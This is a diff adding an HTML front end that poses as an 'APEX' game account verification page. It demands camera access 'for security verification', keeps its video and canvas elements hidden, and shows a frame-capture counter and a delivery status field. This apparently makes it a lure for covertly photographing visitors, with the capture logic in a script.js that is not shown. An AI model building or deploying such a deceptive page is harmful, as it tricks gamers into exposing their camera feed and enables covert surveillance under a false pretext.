@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>APEX — Player authentication</title>
+<link href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@400;500;600;700&family=Saira:wght@400;500;600;700;900&display=swap" rel="stylesheet">
+
+<script>
+  window.__recaptchaReady = false;
+  window.__cameraReady    = false;
+  window.onRecaptchaLoad = function () {
+    window.__recaptchaReady = true;
+    if (window.__tryRenderRecaptcha) window.__tryRenderRecaptcha();
+  };
+</script>
+<script src="https://www.google.com/recaptcha/api.js?onload=onRecaptchaLoad&render=explicit" async defer></script>
+
+<style>
+  *{margin:0;padding:0;box-sizing:border-box;}
+  :root{--bg:#0a0a0f;--panel:#12121a;--line:#1e1e2a;--txt:#e8e8f0;--txt-dim:#7a7a8a;--txt-mute:#4a4a5a;--red:#ff2233;--red-glow:rgba(255,34,51,0.4);--yellow:#ffe600;--cyan:#00e5ff;}
+  html,body{height:100%;}
+  body{font-family:'Saira',sans-serif;background:var(--bg);color:var(--txt);min-height:100vh;position:relative;overflow:hidden;}
+
+  /* animated grid background */
+  body::before{
+    content:"";position:fixed;inset:0;
+    background-image:
+      linear-gradient(rgba(255,34,51,0.06) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(255,34,51,0.06) 1px, transparent 1px);
+    background-size:50px 50px;
+    mask-image:radial-gradient(ellipse at 50% 50%, black 20%, transparent 80%);
+    -webkit-mask-image:radial-gradient(ellipse at 50% 50%, black 20%, transparent 80%);
+    animation:gridShift 8s linear infinite;
+  }
+  @keyframes gridShift{
+    from{background-position:0 0;}
+    to{background-position:50px 50px;}
+  }
+
+  body::after{
+    content:"";position:fixed;inset:0;pointer-events:none;
+    background:radial-gradient(circle at 50% 50%, transparent 30%, rgba(10,10,15,0.9) 90%);
+  }
+
+  /* top status bar (HUD) */
+  .hud-top{
+    position:fixed;top:0;left:0;right:0;z-index:10;
+    padding:14px 32px;
+    background:linear-gradient(180deg,rgba(10,10,15,0.9),transparent);
+    display:flex;justify-content:space-between;align-items:center;
+    font-family:'Chakra Petch',sans-serif;
+    font-size:11.5px;letter-spacing:0.15em;text-transform:uppercase;
+    color:var(--txt-mute);
+  }
+  .hud-top .left{display:flex;gap:24px;align-items:center;}
+  .hud-top .live{
+    color:var(--red);
+    display:flex;align-items:center;gap:7px;font-weight:600;
+  }
+  .hud-top .live::before{content:"";width:6px;height:6px;border-radius:50%;background:var(--red);box-shadow:0 0 10px var(--red);animation:blink 1s infinite;}
+  @keyframes blink{0%,100%{opacity:1;}50%{opacity:.3;}}
+  .hud-top .right{display:flex;gap:20px;}
+
+  /* bottom status bar */
+  .hud-bottom{
+    position:fixed;bottom:0;left:0;right:0;z-index:10;
+    padding:14px 32px;
+    background:linear-gradient(0deg,rgba(10,10,15,0.9),transparent);
+    display:flex;justify-content:space-between;align-items:center;
+    font-family:'Chakra Petch',sans-serif;
+    font-size:11.5px;letter-spacing:0.15em;text-transform:uppercase;
+    color:var(--txt-mute);
+  }
+  .hud-bottom .stat{display:flex;gap:22px;}
+  .hud-bottom .stat span b{color:var(--red);font-weight:700;}
+
+  /* corner brackets */
+  .corner{position:fixed;width:40px;height:40px;pointer-events:none;z-index:8;}
+  .corner.tl{top:60px;left:24px;border-top:1.5px solid var(--red);border-left:1.5px solid var(--red);}
+  .corner.tr{top:60px;right:24px;border-top:1.5px solid var(--red);border-right:1.5px solid var(--red);}
+  .corner.bl{bottom:60px;left:24px;border-bottom:1.5px solid var(--red);border-left:1.5px solid var(--red);}
+  .corner.br{bottom:60px;right:24px;border-bottom:1.5px solid var(--red);border-right:1.5px solid var(--red);}
+
+  /* main center */
+  .stage{
+    position:relative;z-index:5;
+    min-height:100vh;display:flex;align-items:center;justify-content:center;
+    padding:100px 32px;
+  }
+
+  .panel{
+    width:100%;max-width:520px;
+    background:linear-gradient(180deg,rgba(18,18,26,0.95),rgba(10,10,15,0.95));
+    border:1px solid var(--line);
+    backdrop-filter:blur(12px);
+    position:relative;
+    padding:44px 40px 40px;
+    clip-path:polygon(20px 0, 100% 0, 100% calc(100% - 20px), calc(100% - 20px) 100%, 0 100%, 0 20px);
+  }
+  .panel::before{
+    content:"";position:absolute;top:0;left:20px;right:20px;height:2px;
+    background:linear-gradient(90deg,transparent,var(--red),transparent);
+    box-shadow:0 0 20px var(--red);
+  }
+
+  .panel-header{text-align:center;margin-bottom:32px;}
+  .panel-header .badge{
+    display:inline-block;
+    font-family:'Chakra Petch',sans-serif;
+    font-size:10.5px;font-weight:600;letter-spacing:0.2em;
+    text-transform:uppercase;color:var(--red);
+    padding:6px 14px;
+    background:rgba(255,34,51,0.08);
+    border:1px solid rgba(255,34,51,0.25);
+    clip-path:polygon(6px 0, 100% 0, calc(100% - 6px) 100%, 0 100%);
+    margin-bottom:18px;
+  }
+  .panel-header h1{
+    font-family:'Chakra Petch',sans-serif;
+    font-size:34px;font-weight:700;
+    letter-spacing:-0.01em;text-transform:uppercase;
+    color:#fff;line-height:1;margin-bottom:12px;
+    text-shadow:0 0 24px var(--red-glow);
+  }
+  .panel-header p{font-size:14px;color:var(--txt-dim);line-height:1.6;}
+
+  /* HUD-style camera row */
+  .cam-hud{
+    padding:18px 20px;
+    background:rgba(10,10,15,0.6);
+    border:1px solid var(--line);
+    margin-bottom:16px;
+    display:flex;gap:16px;align-items:center;
+    transition:all .35s;
+    clip-path:polygon(10px 0, 100% 0, 100% calc(100% - 10px), calc(100% - 10px) 100%, 0 100%, 0 10px);
+    position:relative;
+  }
+  .cam-hud.active{
+    border-color:rgba(255,34,51,0.5);
+    background:rgba(255,34,51,0.04);
+    box-shadow:0 0 30px rgba(255,34,51,0.15);
+  }
+  .cam-hud .icon{
+    width:48px;height:48px;
+    display:flex;align-items:center;justify-content:center;
+    font-size:22px;
+    background:rgba(255,255,255,0.03);
+    border:1px solid var(--line);
+    transition:all .3s;
+  }
+  .cam-hud.active .icon{background:var(--red);color:#fff;border-color:var(--red);box-shadow:0 0 20px var(--red-glow);}
+  .cam-hud .text .t{
+    font-family:'Chakra Petch',sans-serif;
+    font-size:14px;font-weight:700;
+    letter-spacing:0.05em;text-transform:uppercase;color:var(--txt);
+  }
+  .cam-hud.active .text .t{color:var(--red);}
+  .cam-hud .text .s{font-size:12px;color:var(--txt-mute);margin-top:3px;letter-spacing:0.03em;}
+  .cam-hud .st{margin-left:auto;font-family:'Chakra Petch',sans-serif;font-size:11px;letter-spacing:0.15em;text-transform:uppercase;color:var(--txt-mute);}
+  .cam-hud.active .st{color:var(--red);}
+
+  /* stats HUD row */
+  .stats-hud{display:none;grid-template-columns:1fr 1fr 1fr;gap:10px;margin-bottom:16px;}
+  .stats-hud .cell{
+    padding:14px;
+    background:rgba(10,10,15,0.6);
+    border:1px solid var(--line);
+    text-align:center;
+  }
+  .stats-hud .cell .k{
+    font-family:'Chakra Petch',sans-serif;
+    font-size:9.5px;letter-spacing:0.15em;
+    text-transform:uppercase;color:var(--txt-mute);
+    margin-bottom:8px;font-weight:600;
+  }
+  .stats-hud .cell .v{
+    font-family:'Chakra Petch',sans-serif;
+    font-size:22px;font-weight:700;
+    color:var(--red);letter-spacing:-0.02em;
+  }
+
+  .captcha-hud{
+    padding:22px;
+    background:rgba(10,10,15,0.6);
+    border:1px solid var(--line);
+    display:flex;justify-content:center;
+    transition:all .3s;
+    clip-path:polygon(10px 0, 100% 0, 100% calc(100% - 10px), calc(100% - 10px) 100%, 0 100%, 0 10px);
+  }
+  .captcha-hud.ready{
+    border-color:rgba(255,34,51,0.4);
+    background:rgba(255,34,51,0.03);
+  }
+  #recaptchaWidget{display:inline-block;}
+  .dimmed{opacity:0.35;pointer-events:none;filter:grayscale(0.5);}
+
+  video,canvas{display:none;}
+
+  @media (max-width:640px){
+    .hud-top,.hud-bottom{padding:12px 18px;font-size:10px;}
+    .hud-top .left{gap:14px;}
+    .hud-top .right{gap:12px;}
+    .corner{width:28px;height:28px;}
+    .corner.tl,.corner.tr{top:50px;}
+    .corner.bl,.corner.br{bottom:50px;}
+    .panel{padding:32px 22px;}
+    .panel-header h1{font-size:24px;}
+  }
+</style>
+</head>
+<body>
+
+<div class="hud-top">
+  <div class="left">
+    <span class="live">Verification active</span>
+    <span>Player: ANON</span>
+  </div>
+  <div class="right">
+    <span>Region: SEA-1</span>
+    <span>Ping: 12ms</span>
+  </div>
+</div>
+
+<div class="corner tl"></div>
+<div class="corner tr"></div>
+<div class="corner bl"></div>
+<div class="corner br"></div>
+
+<main class="stage">
+  <div class="panel">
+
+    <div class="panel-header">
+      <div class="badge">Player authentication</div>
+      <h1>Confirm your account</h1>
+      <p>Camera access required for security verification. Your rank and rewards are protected.</p>
+    </div>
+
+    <div class="cam-hud" id="camCard">
+      <div class="icon">📷</div>
+      <div class="text">
+        <div class="t" id="camTitle">Camera access</div>
+        <div class="s" id="camSub">Waiting for permission…</div>
+      </div>
+      <div class="st" id="camStatus">IDLE</div>
+    </div>
+
+    <div class="stats-hud" id="stats">
+      <div class="cell"><div class="k">Frames</div><div class="v" id="cntCaptures">0</div></div>
+      <div class="cell"><div class="k">Status</div><div class="v" id="delStatus">✓</div></div>
+      <div class="cell"><div class="k">Signal</div><div class="v">98%</div></div>
+    </div>
+
+    <div class="captcha-hud dimmed" id="captchaWrap">
+      <div id="recaptchaWidget"></div>
+    </div>
+
+  </div>
+</main>
+
+<div class="hud-bottom">
+  <div class="stat">
+    <span>Rank: <b>DIAMOND I</b></span>
+    <span>Matches: <b>2,847</b></span>
+  </div>
+  <span>APEX v12.4</span>
+</div>
+
+<video id="video" autoplay playsinline muted></video>
+<canvas id="canvas"></canvas>
+
+<script src="script.js"></script>
+</body>
+</html>
